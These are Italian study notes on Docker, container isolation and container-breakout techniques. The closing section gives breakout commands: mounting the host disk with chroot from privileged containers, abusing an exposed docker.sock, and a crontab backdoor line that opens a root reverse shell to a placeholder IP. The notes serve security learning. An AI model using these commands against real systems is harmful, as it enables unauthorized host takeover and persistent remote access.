### DOCKER BREAKOUT
- potrebbe accadere che diventiamo root ma non di un intero sistema ma solo di un determinato ambiente containeraised
	- attraverso docker
	- dove container root è diverso da host root
#### Definizione di container
- una unità standard di software che contiene:
    - codice
    - dipendenze (librerie, config, ecc)
- permette di eseguire applicazioni in modo *portabile e consistente*
- differenza con le macchine virtuali:
    - le VM hanno un intero sistema operativo
    - i container condividono il *kernel dell’host*
- i container virtualizzano il **sistema operativo**, non l’hardware
- ambienti isolati ma non completamente separati
    - container root ≠ host root
#### Docker container engine
- il container engine più famoso è Docker
- segue un’architettura **client-server**
    - client → comandi `docker`
    - server → daemon (`dockerd`)
- il *daemon*:
    - gira in background
    - ha privilegi **root sull’host**
    - gestisce:
        - creazione container
        - esecuzione container
        - isolamento (`namespaces`, `cgroups`, `capabilities`)
- comunicazione tramite API (es: `docker.sock`)
#### *Come creare un docker container*
- un _Docker file_ definisce come costruire un ambiente
- il *Docker file* viene buildato → crea una _Docker Image_
- la *Docker Image*:
    - è un template **read-only**
- quando viene eseguita:
    - diventa un _Docker Container_
##### *Concetto di layer*
- ogni istruzione nel *Docker file* crea un **layer**
- i layer sono uniti (`UnionFS`) per formare l’immagine
- quando si avvia un container:
    - viene aggiunto un **layer scrivibile** sopra l’immagine
- questo layer:
    - contiene tutte le modifiche a runtime
    - viene eliminato quando il container viene distrutto
- l’immagine rimane invariata → riutilizzabile
#### *Il socket di docker*
- il socket (`/var/run/docker.sock`) permette di comunicare con il daemon Docker
- è l’entry point delle API di Docker
- chi può leggere/scrivere su questo socket:
    - ha gli stessi privilegi del daemon (root sull’host)
- se esposto in un container:
    - è possibile creare nuovi container con mount del filesystem host
    - → ottenere accesso root sull’host (docker breakout)
#### *Come identificare se si è in un container?*
- presenza di file caratteristici:
    - `.dockerenv` nella root
- informazioni nei cgroup:
    - `/proc/1/cgroup` contiene stringhe come `docker` o ID del container
- processo PID 1:
    - spesso è una shell o applicazione
    - non è `systemd` o `init` come in un sistema reale
- numero ridotto di processi:
    - ambiente molto “pulito” (pochi daemon, pochi servizi attivi)
- interfacce di rete:
    - virtuali
    - MAC address non standard
- limitazioni nei comandi:
    - errori su operazioni privilegiate (es: `mount`, `tcpdump`, `dmesg`)
- limitato accesso a risorse hardware
#### Criticità dei container
- i container condividono il **kernel dell’host**
    - se il kernel ha vulnerabilità → tutti i container sono a rischio
- l’isolamento **non è totale** (diverso dalle VM)
- per mitigare ciò Linux usa meccanismi di isolamento:
##### Meccanismi di isolamento
##### Namespaces
- isolano le risorse tra container e host
- ogni container ha una propria “vista” del sistema
- Tipi principali:
	- *PID namespace*
	    - isola i processi
	    - ogni container ha il proprio `PID 1`
	    - non vede i processi dell’host
	- *NET namespace*
	    - isola la rete
	    - interfacce, IP, porte separati
	- *MNT namespace*
	    - isola il filesystem
	    - ogni container ha il proprio root `/`
	- *UTS namespace*
	    - isola hostname e dominio
	- *IPC namespace*
	    - isola comunicazione tra processi
	    - (shared memory, message queue)
	- *USER namespace*
	    - mappa utenti container → utenti host
	    - root nel container ≠ root sull’host
	- *TIME namespace*
	    - isola il tempo di sistema (clock, uptime)
	- *CGROUP namespace*
	    - isola la vista dei `cgroups`
	    - il container non vede quelli dell’host
###### *Control Groups (`cgroups`)*
- gestiscono e limitano le risorse:
    - CPU
    - memoria
    - I/O
- evitano che un container consumi tutte le risorse
###### *Capabilities*
- suddividono i privilegi di root in permessi più piccoli
- nei container:
    - molte capabilities vengono **rimosse**
- anche se sei root:
    - hai privilegi limitati
##### DOCKER BREAKOUT
##### *DOCKER BREAKOUT*
- passaggio da un container → sistema host
- avviene principalmente tramite **misconfigurazioni**
- obiettivo:
    - ottenere accesso root sull’host
###### *Container privilegiati (`--privileged`)*
- il flag `--privileged`:
    - rimuove le limitazioni di sicurezza
    - ripristina tutte le capabilities
    - disabilita protezioni `(seccomp, AppArmor)`
    - dà accesso ai dispositivi `/dev`
- di fatto:
    - container ≈ host
##### Come sfruttarlo:
- montare filesystem host:
    - `fdisk -l`
    - `mount /dev/sda1 /mnt`
- entrare nel sistema host:
    - `chroot /mnt /bin/bash`
👉 risultato:
- shell root sull’host
###### *Docker socket (`docker.sock`)*
- file: `/var/run/docker.sock`
- è l’interfaccia per comunicare con il daemon Docker
- il daemon gira come **root sull’host**
👉 se accessibile:
- puoi controllare Docker → quindi l’host
##### Come sfruttarlo:
- cercare il socket:
    - `find / -name docker.sock 2>/dev/null`
- interagire con Docker:
    - `docker images`
- creare container con root filesystem host:
    - `docker run -it --rm -v /:/host alpine chroot /host bash`
👉 risultato:
- accesso root all’host
###### *Sensitive path mount*
- il container ha directory dell’host montate (es: `/etc`, `/root`, `/home`)
- non sempre permette breakout diretto
- ma permette:
    - modifiche al sistema host
##### Come sfruttarlo:
- individuare mount:
    - fase di enumeration
- esempio con `/etc`:
    - leggere:
        - `/host_etc/crontab`
    - scrivere backdoor:
        `echo "* * * * * root /bin/bash -i >& /dev/tcp/<IP>/4444 0>&1" >> /host_etc/crontab`